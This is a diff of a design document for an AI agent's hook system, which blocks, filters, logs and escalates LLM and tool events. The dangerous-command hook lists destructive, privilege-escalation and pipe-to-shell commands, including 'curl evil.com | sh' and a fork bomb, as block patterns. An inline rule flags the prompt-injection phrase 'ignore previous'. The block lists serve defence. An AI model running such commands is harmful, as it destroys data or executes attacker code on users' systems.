@@ -1,195 +1,321 @@
-# Hook & Guardrail System Design
+# Unified Hook System Design
 
 ## Executive Summary
 
-This document proposes a comprehensive hook and guardrail system for OllieBot, inspired by:
-- **Claude Code's Hook System**: 12 lifecycle events with shell/prompt/agent hook types
-- **UiPath's Guardrail Platform**: Multi-level guardrails (Agent, LLM, Tool) with rule-based actions
+This document proposes a **unified Hook system** for OllieBot that can implement all guardrail scenarios without needing a separate guardrail abstraction. The key insight is that guardrails are a **subset of hook functionality** - any guardrail rule can be expressed as a hook with the right return value.
 
-The design leverages OllieBot's existing `.md` to `.js` compilation pipeline to allow users to express hook logic in natural language Markdown files that compile to executable JavaScript.
+**Design Principle**: One system (Hooks) with a rich enough return schema to handle logging, filtering, blocking, escalation, and transformation.
 
 ---
 
-## Part 1: Lifecycle Events
+## Part 1: Why Hooks Can Replace Guardrails
 
-### 1.1 Proposed Event Taxonomy
+### 1.1 UiPath Guardrails → Hook Mapping
 
-Based on research and your architecture, here are the recommended lifecycle events organized by level:
+Every UiPath guardrail feature maps directly to a hook capability:
+
+| UiPath Guardrail | Hook Equivalent |
+|------------------|-----------------|
+| **Scopes** | |
+| Agent scope | `PreUserInput` / `PostAgentResponse` events |
+| LLM scope | `PreLLMRequest` / `PostLLMResponse` events |
+| Tool scope | `PreToolUse` / `PostToolUse` events |
+| **Timing** | |
+| Pre-execution | `Pre*` hook events |
+| Post-execution | `Post*` hook events |
+| Both | Register hooks on both events |
+| **Actions** | |
+| Log | Return `{ decision: 'allow', log: { severity, message } }` |
+| Filter | Return `{ decision: 'allow', updatedResponse: filtered }` |
+| Block | Return `{ decision: 'block', reason: '...' }` |
+| Escalate | Return `{ decision: 'ask', escalation: { to, message } }` |
+| Transform | Return `{ decision: 'allow', updatedInput: transformed }` |
+| **Rules** | |
+| Multiple conditions (AND) | JavaScript logic in hook handler |
+| Regex matching | Native regex in hook code |
+| Field checking | Object property access in hook code |
+
+### 1.2 What Hooks Add Beyond Guardrails
+
+Hooks provide capabilities guardrails cannot:
+
+| Capability | Guardrails | Hooks |
+|------------|------------|-------|
+| Async operations | No | Yes |
+| External API calls | No | Yes |
+| Database lookups | No | Yes |
+| LLM-based evaluation | No | Yes |
+| Stateful logic | No | Yes |
+| Complex conditionals | Limited | Unlimited |
+| Custom actions | Predefined only | Any code |
+
+**Conclusion**: Hooks are a superset. We only need one system.
+
+---
+
+## Part 2: Lifecycle Events
+
+### 2.1 Event Taxonomy
 
 ```
 ┌─────────────────────────────────────────────────────────────────────────────┐
 │                           SESSION LEVEL                                      │
 ├─────────────────────────────────────────────────────────────────────────────┤
-│  SessionStart     │ New session begins or resumes                           │
-│  SessionEnd       │ Session terminates (logout, exit, timeout)              │
+│  SessionStart     │ Agent session begins                                    │
+│  SessionEnd       │ Agent session terminates                                │
 └─────────────────────────────────────────────────────────────────────────────┘
                                       │
                                       ▼
 ┌─────────────────────────────────────────────────────────────────────────────┐
-│                          USER/INPUT LEVEL                                    │
+│                          USER/INPUT LEVEL (≈ UiPath Agent Scope)            │
 ├─────────────────────────────────────────────────────────────────────────────┤
-│  PreUserInput     │ Before user message is processed (can block/modify)     │
-│  PostUserInput    │ After user message validated, before LLM call           │
+│  PreUserInput     │ Before user message processed      [CAN BLOCK/MODIFY]   │
+│  PostUserInput    │ After validation, before LLM call  [CAN MODIFY]         │
 └─────────────────────────────────────────────────────────────────────────────┘
                                       │
                                       ▼
 ┌─────────────────────────────────────────────────────────────────────────────┐
-│                            LLM LEVEL                                         │
+│                            LLM LEVEL (≈ UiPath LLM Scope)                    │
 ├─────────────────────────────────────────────────────────────────────────────┤
-│  PreLLMRequest    │ Before sending request to LLM provider                  │
-│  PostLLMResponse  │ After receiving LLM response, before processing         │
+│  PreLLMRequest    │ Before sending to LLM provider     [CAN BLOCK/MODIFY]   │
+│  PostLLMResponse  │ After receiving LLM response       [CAN BLOCK/MODIFY]   │
 └─────────────────────────────────────────────────────────────────────────────┘
                                       │
                                       ▼
 ┌─────────────────────────────────────────────────────────────────────────────┐
-│                           TOOL LEVEL                                         │
+│                           TOOL LEVEL (≈ UiPath Tool Scope)                   │
 ├─────────────────────────────────────────────────────────────────────────────┤
-│  PreToolUse       │ Before tool execution (can block/modify input)          │
-│  PostToolUse      │ After successful tool execution (can modify output)     │
-│  PostToolFailure  │ After tool execution fails                              │
+│  PreToolUse       │ Before tool execution              [CAN BLOCK/MODIFY]   │
+│  PostToolUse      │ After tool execution               [CAN MODIFY]         │
+│  ToolError        │ When tool execution fails          [CAN MODIFY ERROR]   │
 └─────────────────────────────────────────────────────────────────────────────┘
                                       │
                                       ▼
 ┌─────────────────────────────────────────────────────────────────────────────┐
-│                          AGENT LEVEL                                         │
+│                          AGENT/RESPONSE LEVEL                                │
 ├─────────────────────────────────────────────────────────────────────────────┤
-│  PreAgentResponse │ Before agent sends response to user (can modify)        │
-│  PostAgentResponse│ After response sent (for logging/analytics)             │
-│  AgentDelegation  │ When supervisor delegates to sub-agent                  │
-│  AgentComplete    │ When agent finishes all work (Stop equivalent)          │
+│  PreAgentResponse │ Before response sent to user       [CAN BLOCK/MODIFY]   │
+│  PostAgentResponse│ After response delivered           [OBSERVE ONLY]       │
+│  AgentDelegation  │ When spawning sub-agent            [CAN BLOCK/MODIFY]   │
 └─────────────────────────────────────────────────────────────────────────────┘
 ```
 
-### 1.2 Event Details & Blocking Capability
+### 2.2 Event Capabilities Matrix
 
-| Event | Level | Can Block? | Can Modify? | Primary Use Cases |
-|-------|-------|------------|-------------|-------------------|
-| `SessionStart` | Session | No | Yes (inject context) | Initialize state, load user preferences |
-| `SessionEnd` | Session | No | No | Cleanup, save state, analytics |
-| `PreUserInput` | User | **Yes** | **Yes** | Input validation, profanity filter, PII detection |
-| `PostUserInput` | User | No | Yes (enrich) | Add context, fetch user history |
-| `PreLLMRequest` | LLM | **Yes** | **Yes** | Prompt injection detection, cost limits |
-| `PostLLMResponse` | LLM | **Yes** | **Yes** | Content moderation, output sanitization |
-| `PreToolUse` | Tool | **Yes** | **Yes** | Permission check, parameter validation |
-| `PostToolUse` | Tool | No | **Yes** | Filter sensitive output, logging |
-| `PostToolFailure` | Tool | No | No | Error reporting, fallback logic |
-| `PreAgentResponse` | Agent | **Yes** | **Yes** | Final content check, formatting |
-| `PostAgentResponse` | Agent | No | No | Analytics, conversation logging |
-| `AgentDelegation` | Agent | **Yes** | **Yes** | Control sub-agent spawning |
-| `AgentComplete` | Agent | **Yes** | No | Verify task completion |
+| Event | Can Block | Can Modify Input | Can Modify Output | Async | UiPath Equivalent |
+|-------|-----------|------------------|-------------------|-------|-------------------|
+| `SessionStart` | No | Yes (inject context) | - | Yes | - |
+| `SessionEnd` | No | - | - | Yes | - |
+| `PreUserInput` | **Yes** | **Yes** | - | Yes | Agent Pre |
+| `PostUserInput` | No | Yes (enrich) | - | Yes | - |
+| `PreLLMRequest` | **Yes** | **Yes** | - | Yes | LLM Pre |
+| `PostLLMResponse` | **Yes** | - | **Yes** | Yes | LLM Post |
+| `PreToolUse` | **Yes** | **Yes** | - | Yes | Tool Pre |
+| `PostToolUse` | No | - | **Yes** | Yes | Tool Post |
+| `ToolError` | No | - | Yes (error msg) | Yes | - |
+| `PreAgentResponse` | **Yes** | - | **Yes** | Yes | Agent Post |
+| `PostAgentResponse` | No | - | - | Yes | - |
+| `AgentDelegation` | **Yes** | **Yes** | - | Yes | - |
 
 ---
 
-## Part 2: Guardrail System (UiPath-Inspired)
+## Part 3: Hook Return Schema (The Key to Unification)
 
-### 2.1 Guardrail Concept
+The return schema is what allows hooks to implement all guardrail actions:
 
-Guardrails are **declarative safety rules** that evaluate conditions and trigger actions. Unlike hooks (which are procedural code), guardrails are rule-based configurations.
+```typescript
+interface HookResult {
+  /**
+   * DECISION - Controls execution flow
+   * - 'allow': Continue execution (optionally with modifications)
+   * - 'block': Stop execution, return error to user
+   * - 'ask': Pause for human confirmation (escalation)
+   */
+  decision: 'allow' | 'block' | 'ask';
 
+  /**
+   * REASON - Explanation for blocking/asking
+   * Shown to user when decision is 'block' or 'ask'
+   */
+  reason?: string;
+
+  /**
+   * MODIFICATION - Change data before continuing
+   * Only used when decision is 'allow'
+   */
+  updatedInput?: Record<string, any>;   // For Pre* events
+  updatedResponse?: any;                 // For Post* events
+
+  /**
+   * LOGGING - Record event (UiPath Log action)
+   * Always executed regardless of decision
+   */
+  log?: {
+    severity: 'info' | 'warning' | 'error';
+    message: string;
+    data?: Record<string, any>;
+  };
+
+  /**
+   * ESCALATION - Notify human (UiPath Escalate action)
+   * Used when decision is 'ask'
+   */
+  escalation?: {
+    to: string;                          // User ID, email, or channel
+    message: string;
+    priority: 'low' | 'medium' | 'high';
+    timeout?: number;                    // Auto-proceed after N seconds
+    defaultDecision?: 'allow' | 'block'; // If timeout reached
+  };
+
+  /**
+   * CONTEXT INJECTION - Add info for downstream processing
+   */
+  context?: {
+    systemMessage?: string;              // Injected into LLM context
+    userMessage?: string;                // Shown to user (not LLM)
+    metadata?: Record<string, any>;      // Attached to request
+  };
+}
 ```
-┌─────────────────────────────────────────────────────────────────────────┐
-│                         GUARDRAIL STRUCTURE                              │
-├─────────────────────────────────────────────────────────────────────────┤
-│  Guardrail                                                               │
-│  ├── name: string              (identifier)                              │
-│  ├── description: string       (what it protects against)                │
-│  ├── scope: agent|llm|tool     (where it applies)                        │
-│  ├── timing: pre|post|both     (when it runs)                            │
-│  ├── matcher?: string          (regex for tool/event filtering)          │
-│  ├── rules: Rule[]             (conditions to evaluate - ALL must match) │
-│  │   ├── type: string          (rule type: contains, matches, threshold) │
-│  │   ├── field: string         (which field to check)                    │
-│  │   ├── operator: string      (comparison operator)                     │
-│  │   └── value: any            (value to compare against)                │
-│  └── action: Action            (what to do when triggered)               │
-│      ├── type: string          (log|filter|block|escalate|transform)     │
-│      ├── severity?: string     (info|warning|error)                      │
-│      ├── reason?: string       (explanation for blocking)                │
-│      ├── filterFields?: string[](fields to remove)                       │
-│      └── escalateTo?: string   (user/channel for escalation)             │
-└─────────────────────────────────────────────────────────────────────────┘
+
+### 3.1 Implementing UiPath Actions with Hook Returns
+
+**Log Action**:
+```javascript
+return {
+  decision: 'allow',
+  log: {
+    severity: 'warning',
+    message: 'PII detected in input',
+    data: { field: 'email', value: '[REDACTED]' }
+  }
+};
 ```
 
-### 2.2 Guardrail Scopes
+**Filter Action** (remove/mask fields):
+```javascript
+return {
+  decision: 'allow',
+  updatedResponse: {
+    ...input.toolResponse,
+    result: maskPII(input.toolResponse.result)
+  }
+};
+```
 
-**Agent-Level Guardrails**
-- Evaluate system prompts and agent instructions
-- Monitor overall agent behavior patterns
-- Example: Ensure agent stays within defined persona
+**Block Action**:
+```javascript
+return {
+  decision: 'block',
+  reason: 'Dangerous command detected: rm -rf',
+  log: {
+    severity: 'error',
+    message: 'Blocked dangerous bash command',
+    data: { command: input.toolInput.command }
+  }
+};
+```
 
-**LLM-Level Guardrails**
-- Monitor requests to and responses from LLM providers
-- Detect prompt injection, jailbreak attempts
-- Example: Block responses containing harmful content
+**Escalate Action**:
+```javascript
+return {
+  decision: 'ask',
+  reason: 'This action requires approval',
+  escalation: {
+    to: 'admin@company.com',
+    message: `User ${context.userId} wants to delete production database`,
+    priority: 'high',
+    timeout: 300000,  // 5 minutes
+    defaultDecision: 'block'
+  }
+};
+```
 
-**Tool-Level Guardrails**
-- Validate tool inputs and outputs
-- Prevent dangerous operations
-- Example: Block file deletion outside sandbox
-
-### 2.3 Available Actions
-
-| Action | Description | Parameters |
-|--------|-------------|------------|
-| `log` | Record event without blocking | `severity: info\|warning\|error` |
-| `filter` | Remove sensitive fields | `fields: string[]` |
-| `block` | Prevent execution | `reason: string` |
-| `escalate` | Notify human for intervention | `to: user\|channel`, `app?: string` |
-| `transform` | Modify data before continuing | `transformer: function\|template` |
-
-### 2.4 Built-in Guardrails (Out-of-the-Box)
-
-| Name | Scope | Timing | Description |
-|------|-------|--------|-------------|
-| `pii-detection` | agent, llm | both | Detect/mask PII (email, phone, SSN, etc.) |
-| `prompt-injection` | llm | pre | Detect manipulation attempts |
-| `content-moderation` | llm | post | Filter harmful/inappropriate content |
-| `rate-limiting` | llm | pre | Prevent excessive LLM calls |
-| `output-length` | llm | post | Truncate excessively long responses |
-| `dangerous-commands` | tool | pre | Block dangerous bash/system commands |
-| `file-system-bounds` | tool | pre | Restrict file operations to allowed paths |
-| `external-url-allowlist` | tool | pre | Restrict web requests to allowed domains |
+**Transform Action** (modify and continue):
+```javascript
+return {
+  decision: 'allow',
+  updatedInput: {
+    ...input.toolInput,
+    command: input.toolInput.command.replace(/--force/g, '')  // Remove dangerous flags
+  },
+  log: {
+    severity: 'info',
+    message: 'Removed --force flag from command'
+  }
+};
+```
 
 ---
 
-## Part 3: Hook Definition Methods
+## Part 4: Hook Definition Methods
 
-### 3.1 Method 1: Markdown to JavaScript Compilation (Recommended)
+### 4.1 Method 1: Markdown → JavaScript (Primary Method)
 
-Leverage the existing `.md` → `.js` compilation pipeline for user-defined hooks.
+Leverages existing `.md` → `.js` compilation pipeline. Users write natural language, system compiles to executable code.
 
-**File Location**: `user/hooks/<event-name>/<hook-name>.md`
-
-**Example**: `user/hooks/PreToolUse/block-dangerous-commands.md`
+**File**: `user/hooks/PreToolUse/block-dangerous-commands.md`
 
 ```markdown
-# Block Dangerous Commands
+# Block Dangerous Bash Commands
 
-This hook blocks potentially dangerous bash commands from executing.
+Prevent execution of commands that could harm the system.
 
-## Matcher
-Tool name matches: `Bash`
+## Configuration
 
-## Rules
-- Command must NOT contain: `rm -rf`, `sudo`, `chmod 777`, `curl | sh`
-- Command must NOT access paths outside: `/home/user/olliebot`
+| Property | Value |
+|----------|-------|
+| Event | PreToolUse |
+| Matcher | `^Bash$` |
+| Timeout | 5000ms |
 
-## Action
-If rules are violated:
-- **Block** the tool execution
-- **Reason**: "Blocked potentially dangerous command: {matched_pattern}"
+## Logic
+
+When a Bash command is requested:
+
+1. **Check for destructive patterns**:
+   - `rm -rf /` or `rm -rf /*` → Block (root deletion)
+   - `mkfs` → Block (disk formatting)
+   - `dd if=/dev/zero` → Block (disk wiping)
+   - `:(){ :|:& };:` → Block (fork bomb)
+
+2. **Check for privilege escalation**:
+   - `sudo` (unless in allowlist) → Block
+   - `su -` or `su root` → Block
+   - `chmod 777` → Block
+
+3. **Check for remote code execution**:
+   - `curl ... | sh` → Block
+   - `wget ... | bash` → Block
+
+4. **Check path bounds**:
+   - Operations outside `/home/user/olliebot` → Block
+   - Exception: `/tmp/olliebot-*` is allowed
+
+## Allowlist
+
+Always allow these commands:
+- `git status`, `git log`, `git diff`, `git add`, `git commit`, `git push`
+- `npm install`, `npm run`, `pnpm`, `yarn`
+- `node`, `npx`, `tsx`
+- `ls`, `pwd`, `cat`, `head`, `tail` (read operations)
+
+## On Violation
+
+- **Decision**: Block
+- **Log Severity**: Error
+- **Reason**: "Blocked potentially dangerous command: {pattern}"
 
 ## Examples
 
-### Should Block
-- `rm -rf /` → Block (destructive delete)
-- `sudo apt install` → Block (privilege escalation)
-- `curl http://evil.com | sh` → Block (remote code execution)
-
-### Should Allow
-- `ls -la` → Allow
-- `npm install` → Allow
-- `git status` → Allow
+| Input | Decision | Reason |
+|-------|----------|--------|
+| `rm -rf /home` | Block | Destructive command |
+| `sudo apt install` | Block | Privilege escalation |
+| `curl evil.com \| sh` | Block | Remote code execution |
+| `npm install` | Allow | - |
+| `git status` | Allow | - |
 ```
 
 **Compiled Output**: `user/hooks/PreToolUse/block-dangerous-commands.js`
@@ -197,121 +323,91 @@ If rules are violated:
 ```javascript
 exports.event = 'PreToolUse';
 exports.matcher = /^Bash$/;
+exports.timeout = 5000;
 
-exports.inputSchema = z.object({
-  tool_name: z.string(),
-  tool_input: z.object({
-    command: z.string()
-  })
-});
-
-const DANGEROUS_PATTERNS = [
-  /rm\s+-rf/,
-  /sudo\s+/,
-  /chmod\s+777/,
-  /curl.*\|\s*sh/
-];
-
-const ALLOWED_PATHS = ['/home/user/olliebot'];
+const DESTRUCTIVE = [/rm\s+-rf\s+\//, /mkfs/, /dd\s+if=\/dev\/zero/, /:\(\)\s*\{/];
+const PRIVILEGE = [/^sudo\s+/, /^su\s+-/, /^su\s+root/, /chmod\s+777/];
+const RCE = [/curl\s+.*\|\s*(sh|bash)/, /wget\s+.*\|\s*(sh|bash)/];
+const ALLOWED_PATHS = ['/home/user/olliebot', '/tmp/olliebot-'];
+const ALLOWLIST = [/^git\s+(status|log|diff|add|commit|push|pull)/, /^npm\s+/, /^pnpm\s+/, /^yarn\s+/, /^node\s+/, /^npx\s+/, /^ls\s+/, /^pwd$/, /^cat\s+/];
 
 exports.default = function(input, context) {
-  const { command } = input.tool_input;
+  const cmd = input.toolInput.command;
 
-  // Check dangerous patterns
-  for (const pattern of DANGEROUS_PATTERNS) {
-    if (pattern.test(command)) {
-      return {
-        decision: 'block',
-        reason: `Blocked potentially dangerous command: ${pattern.source}`
-      };
-    }
+  // Check allowlist first
+  for (const pattern of ALLOWLIST) {
+    if (pattern.test(cmd)) return { decision: 'allow' };
   }
 
-  // Check path bounds (simplified)
-  // ... path validation logic
+  // Check dangerous patterns
+  const checks = [
+    { patterns: DESTRUCTIVE, category: 'Destructive command' },
+    { patterns: PRIVILEGE, category: 'Privilege escalation' },
+    { patterns: RCE, category: 'Remote code execution' }
+  ];
+
+  for (const { patterns, category } of checks) {
+    for (const pattern of patterns) {
+      if (pattern.test(cmd)) {
+        return {
+          decision: 'block',
+          reason: `Blocked: ${category}`,
+          log: { severity: 'error', message: category, data: { command: cmd } }
+        };
+      }
+    }
+  }
 
   return { decision: 'allow' };
 };
 ```
 
-### 3.2 Method 2: JSON Configuration (For Simple Rules)
+### 4.2 Method 2: Direct JavaScript (Advanced Users)
 
-For straightforward guardrails without complex logic.
+For complex logic that can't be easily expressed in markdown.
 
-**File Location**: `user/guardrails.json` or `user/hooks/hooks.json`
-
-```json
-{
-  "guardrails": [
-    {
-      "name": "pii-filter",
-      "description": "Remove PII from tool outputs",
-      "scope": "tool",
-      "timing": "post",
-      "matcher": ".*",
-      "rules": [
-        {
-          "type": "regex_match",
-          "field": "tool_response",
-          "pattern": "\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b"
-        }
-      ],
-      "action": {
-        "type": "filter",
-        "replacement": "[EMAIL REDACTED]"
-      }
-    }
-  ],
-  "hooks": {
-    "PreLLMRequest": [
-      {
-        "matcher": "",
-        "hooks": [
-          {
-            "type": "script",
-            "path": "./hooks/PreLLMRequest/inject-context.js"
-          }
-        ]
-      }
-    ]
-  }
-}
-```
-
-### 3.3 Method 3: Inline JavaScript (For Advanced Users)
-
-Direct JavaScript files for complex hook logic.
-
-**File Location**: `user/hooks/<event-name>/<hook-name>.js`
+**File**: `user/hooks/PostLLMResponse/content-moderation.js`
 
 ```javascript
-// user/hooks/PostLLMResponse/content-safety.js
-
-const { Anthropic } = require('@anthropic-ai/sdk');
-
 module.exports = {
   event: 'PostLLMResponse',
-  matcher: '', // Match all
-  async: false,
-  timeout: 30000,
+  matcher: '', // All LLM responses
+  timeout: 10000,
 
   async handler(input, context) {
-    const { response } = input;
+    const content = input.response.content;
 
-    // Use a fast model to check content safety
-    const safety = await context.llmService.complete([
-      {
-        role: 'user',
-        content: `Analyze this response for safety issues. Return JSON with {safe: boolean, issues: string[]}: "${response}"`
-      }
-    ], { model: 'fast' });
+    // Use fast LLM to evaluate content safety
+    const evaluation = await context.llmService.complete([{
+      role: 'user',
+      content: `Evaluate this text for safety issues (violence, hate, illegal advice).
+      Return JSON: {"safe": boolean, "issues": string[], "severity": "none"|"low"|"high"}
 
-    const result = JSON.parse(safety);
+      Text: "${content.substring(0, 2000)}"`
+    }], { model: 'fast' });
 
-    if (!result.safe) {
+    const result = JSON.parse(evaluation);
+
+    if (!result.safe && result.severity === 'high') {
       return {
         decision: 'block',
-        reason: `Content safety issues: ${result.issues.join(', ')}`
+        reason: 'Response blocked due to safety concerns',
+        log: {
+          severity: 'error',
+          message: 'Content moderation triggered',
+          data: { issues: result.issues }
+        }
+      };
+    }
+
+    if (!result.safe && result.severity === 'low') {
+      return {
+        decision: 'allow',
+        log: {
+          severity: 'warning',
+          message: 'Content flagged but allowed',
+          data: { issues: result.issues }
+        }
       };
     }
 
@@ -320,23 +416,24 @@ module.exports = {
 };
 ```
 
-### 3.4 Method 4: Prompt-Based Hooks (LLM-Evaluated)
+### 4.3 Method 3: Inline Configuration (Simple Rules)
 
-Let the LLM itself evaluate conditions. Useful for nuanced decisions.
-
-**Configuration in `hooks.json`**:
+For very simple hooks, define inline in `hooks.json`:
 
 ```json
 {
   "hooks": {
-    "PreAgentResponse": [
+    "PreLLMRequest": [
       {
         "matcher": "",
-        "hooks": [
+        "type": "inline",
+        "rules": [
           {
-            "type": "prompt",
-            "prompt": "Evaluate if this agent response is appropriate and helpful. Consider: 1) Is it accurate? 2) Is it safe? 3) Does it stay on topic? Response to evaluate: $RESPONSE. Return JSON: {\"ok\": boolean, \"reason\": string}",
-            "timeout": 30000
+            "check": "input.messages.some(m => m.content.toLowerCase().includes('ignore previous'))",
+            "action": {
+              "decision": "block",
+              "reason": "Potential prompt injection detected"
+            }
           }
         ]
       }
@@ -347,362 +444,280 @@ Let the LLM itself evaluate conditions. Useful for nuanced decisions.
 
 ---
 
-## Part 4: Hook Context & Parameters
+## Part 5: Built-in Hooks (Equivalents to UiPath Out-of-the-Box Guardrails)
 
-### 4.1 Common Context (All Events)
+Ship these as default hooks users can enable/configure:
 
-Every hook receives these standard fields:
+### 5.1 PII Detection Hook
 
-```typescript
-interface HookContext {
-  // Session information
-  sessionId: string;
-  conversationId: string;
-  channel: 'web' | 'console' | 'teams';
+**File**: `builtin/hooks/pii-detection.js`
 
-  // Agent information
-  agentId: string;
-  agentName: string;
-  agentType: 'supervisor' | 'worker';
-
-  // Timing
-  timestamp: Date;
-  hookEventName: string;
-
-  // Services (for advanced hooks)
-  llmService?: LLMService;       // For prompt-based evaluation
-  toolRunner?: ToolRunner;       // For tool inspection
-  db?: Database;                 // For persistence
-
-  // User context
-  userId?: string;
-  userPermissions?: string[];
-}
-```
-
-### 4.2 Event-Specific Input
-
-**PreUserInput / PostUserInput**:
-```typescript
-interface UserInputEvent {
-  message: {
-    content: string;
-    attachments?: Attachment[];
-    metadata?: Record<string, any>;
-  };
-}
-```
-
-**PreLLMRequest**:
-```typescript
-interface LLMRequestEvent {
-  messages: LLMMessage[];
-  model: string;
-  provider: 'anthropic' | 'openai' | 'google' | 'azure';
-  tools?: ToolDefinition[];
-  temperature?: number;
-  maxTokens?: number;
-}
-```
-
-**PostLLMResponse**:
-```typescript
-interface LLMResponseEvent {
-  response: {
-    content: string;
-    toolUse?: ToolUseRequest[];
-    usage?: {
-      inputTokens: number;
-      outputTokens: number;
-    };
-  };
-  latencyMs: number;
-}
-```
-
-**PreToolUse**:
-```typescript
-interface ToolUseEvent {
-  toolName: string;
-  toolType: 'native' | 'user' | 'mcp';
-  toolInput: Record<string, any>;
-  toolUseId: string;
-}
-```
-
-**PostToolUse**:
-```typescript
-interface ToolResultEvent extends ToolUseEvent {
-  toolResponse: {
-    success: boolean;
-    result: any;
-    error?: string;
-  };
-  durationMs: number;
-}
-```
-
-**PreAgentResponse / PostAgentResponse**:
-```typescript
-interface AgentResponseEvent {
-  response: {
-    content: string;
-    markdown: boolean;
-    attachments?: Attachment[];
-  };
-  originalMessage: Message;
-  toolsUsed: string[];
-  totalDurationMs: number;
-}
-```
-
----
-
-## Part 5: Hook Return Values & Control Flow
-
-### 5.1 Return Value Schema
-
-```typescript
-interface HookResult {
-  // Decision (for blocking events)
-  decision?: 'allow' | 'block' | 'ask';  // 'ask' = require user confirmation
-  reason?: string;                        // Shown when blocked
-
-  // Modification (for modifiable events)
-  updatedInput?: Record<string, any>;     // Modified input data
-  updatedResponse?: any;                  // Modified response data
-
-  // Context injection
-  additionalContext?: string;             // Added to LLM context
-  systemMessage?: string;                 // Shown to user (not LLM)
-
-  // Control flow
-  continue?: boolean;                     // false = stop all processing
-  stopReason?: string;                    // Reason for stopping
-
-  // Logging
-  logEntry?: {
-    severity: 'info' | 'warning' | 'error';
-    message: string;
-    data?: any;
-  };
-
-  // Escalation
-  escalation?: {
-    to: string;                           // User ID or channel
-    message: string;
-    priority: 'low' | 'medium' | 'high';
-  };
-}
-```
-
-### 5.2 Control Flow Examples
-
-**Allow with modification**:
 ```javascript
-return {
-  decision: 'allow',
-  updatedInput: {
-    ...input.tool_input,
-    command: input.tool_input.command.replace(/--force/g, '')  // Remove --force flags
-  }
-};
-```
+module.exports = {
+  event: ['PreUserInput', 'PostLLMResponse', 'PostToolUse'],
+  matcher: '',
 
-**Block with reason**:
-```javascript
-return {
-  decision: 'block',
-  reason: 'This operation requires administrator approval',
-  escalation: {
-    to: 'admin-channel',
-    message: `User attempted: ${input.tool_input.command}`,
-    priority: 'high'
-  }
-};
-```
+  config: {
+    entities: ['email', 'phone', 'ssn', 'credit_card', 'address'],
+    action: 'filter',  // 'filter' | 'block' | 'log'
+    replacement: '[{type} REDACTED]'
+  },
 
-**Log and continue**:
-```javascript
-return {
-  decision: 'allow',
-  logEntry: {
-    severity: 'warning',
-    message: 'Sensitive operation detected',
-    data: { tool: input.toolName, user: context.userId }
-  }
-};
-```
+  patterns: {
+    email: /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g,
+    phone: /\b(\+?1[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b/g,
+    ssn: /\b\d{3}[-]?\d{2}[-]?\d{4}\b/g,
+    credit_card: /\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b/g
+  },
 
----
+  handler(input, context) {
+    const content = this.getContent(input);
+    const detected = [];
+    let filtered = content;
 
-## Part 6: Architecture & Implementation
+    for (const [type, pattern] of Object.entries(this.patterns)) {
+      if (!this.config.entities.includes(type)) continue;
 
-### 6.1 Proposed File Structure
-
-```
-user/
-├── hooks/
-│   ├── hooks.json                    # Hook/guardrail configuration
-│   ├── SessionStart/
-│   │   └── inject-user-prefs.md      # Markdown hook definition
-│   ├── PreUserInput/
-│   │   ├── profanity-filter.md
-│   │   └── profanity-filter.js       # Compiled output
-│   ├── PreLLMRequest/
-│   │   ├── prompt-injection.md
-│   │   └── cost-limiter.js           # Direct JS hook
-│   ├── PostLLMResponse/
-│   │   └── content-moderation.md
-│   ├── PreToolUse/
-│   │   ├── bash-validator.md
-│   │   └── file-bounds.md
-│   ├── PostToolUse/
-│   │   └── pii-filter.md
-│   └── PreAgentResponse/
-│       └── final-review.md
-│
-└── guardrails/
-    ├── guardrails.json               # Declarative guardrail rules
-    └── custom/
-        ├── my-company-policy.json    # Custom guardrail sets
-        └── pii-extended.json
-```
-
-### 6.2 Core Components
-
-```
-┌─────────────────────────────────────────────────────────────────────────┐
-│                        HOOK SYSTEM ARCHITECTURE                          │
-├─────────────────────────────────────────────────────────────────────────┤
-│                                                                          │
-│  ┌──────────────────┐     ┌──────────────────┐     ┌─────────────────┐  │
-│  │   HookManager    │────▶│  HookCompiler    │────▶│  HookExecutor   │  │
-│  │                  │     │                  │     │                 │  │
-│  │ - Load configs   │     │ - .md → .js      │     │ - Run hooks     │  │
-│  │ - Watch files    │     │ - Validate       │     │ - Handle errors │  │
-│  │ - Register hooks │     │ - Cache          │     │ - Aggregate     │  │
-│  └──────────────────┘     └──────────────────┘     └─────────────────┘  │
-│           │                                                │             │
-│           │                                                │             │
-│           ▼                                                ▼             │
-│  ┌──────────────────┐                           ┌─────────────────────┐ │
-│  │ GuardrailEngine  │                           │   EventBus          │ │
-│  │                  │                           │                     │ │
-│  │ - Rule evaluation│                           │ - Emit lifecycle    │ │
-│  │ - Action dispatch│                           │ - Subscribe hooks   │ │
-│  │ - Built-in rules │                           │ - Async support     │ │
-│  └──────────────────┘                           └─────────────────────┘ │
-│                                                                          │
-└─────────────────────────────────────────────────────────────────────────┘
-```
-
-### 6.3 Integration Points
-
-```typescript
-// In LLMService.generateWithToolsStream()
-async generateWithToolsStream(messages, callbacks, options) {
-  // PRE-LLM HOOK
-  const preResult = await this.hookManager.execute('PreLLMRequest', {
-    messages, model: this.model, provider: this.provider, tools: options?.tools
-  });
-
-  if (preResult.decision === 'block') {
-    throw new HookBlockedError(preResult.reason);
-  }
-
-  // Apply modifications
-  const finalMessages = preResult.updatedInput?.messages || messages;
-
-  // Make LLM call
-  const response = await this.provider.complete(finalMessages, options);
-
-  // POST-LLM HOOK
-  const postResult = await this.hookManager.execute('PostLLMResponse', {
-    response, latencyMs: Date.now() - startTime
-  });
-
-  if (postResult.decision === 'block') {
-    throw new HookBlockedError(postResult.reason);
-  }
-
-  return postResult.updatedResponse || response;
-}
-```
-
-```typescript
-// In ToolRunner.executeTools()
-async executeTools(requests) {
-  const results = [];
-
-  for (const request of requests) {
-    // PRE-TOOL HOOK
-    const preResult = await this.hookManager.execute('PreToolUse', {
-      toolName: request.toolName,
-      toolInput: request.input,
-      toolUseId: request.id
-    });
-
-    if (preResult.decision === 'block') {
-      results.push({ id: request.id, error: preResult.reason });
-      continue;
+      const matches = content.match(pattern);
+      if (matches) {
+        detected.push({ type, count: matches.length });
+        if (this.config.action === 'filter') {
+          filtered = filtered.replace(pattern, this.config.replacement.replace('{type}', type.toUpperCase()));
+        }
+      }
     }
 
-    // Apply input modifications
-    const finalInput = preResult.updatedInput || request.input;
+    if (detected.length === 0) {
+      return { decision: 'allow' };
+    }
 
-    // Execute tool
-    const toolResult = await this.execute(request.toolName, finalInput);
+    const log = {
+      severity: 'warning',
